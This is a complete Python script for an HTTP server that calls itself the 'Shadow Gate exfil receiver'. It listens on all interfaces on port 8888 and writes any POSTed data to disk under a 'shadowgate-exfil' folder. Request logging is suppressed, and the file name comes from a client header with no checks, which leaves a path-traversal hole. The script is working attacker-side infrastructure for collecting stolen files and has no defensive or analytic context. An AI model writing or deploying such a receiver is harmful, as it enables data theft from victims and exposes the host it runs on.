import http.server
import os
import datetime

OUT_DIR = "shadowgate-exfil"
os.makedirs(OUT_DIR, exist_ok=True)


class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        data = self.rfile.read(length)
        stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        fname = self.headers.get("X-Filename", "upload.bin")
        out_path = os.path.join(OUT_DIR, stamp + "_" + fname)
        with open(out_path, "wb") as f:
            f.write(data)
        print("Received", len(data), "bytes from", self.client_address[0], "-> saved to", out_path)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, fmt, *args):
        pass


if __name__ == "__main__":
    port = 8888
    print("Shadow Gate exfil receiver listening on port", port)
    print("Files will be saved under ./" + OUT_DIR + "/")
    server = http.server.HTTPServer(("0.0.0.0", port), Handler)
    server.serve_forever()
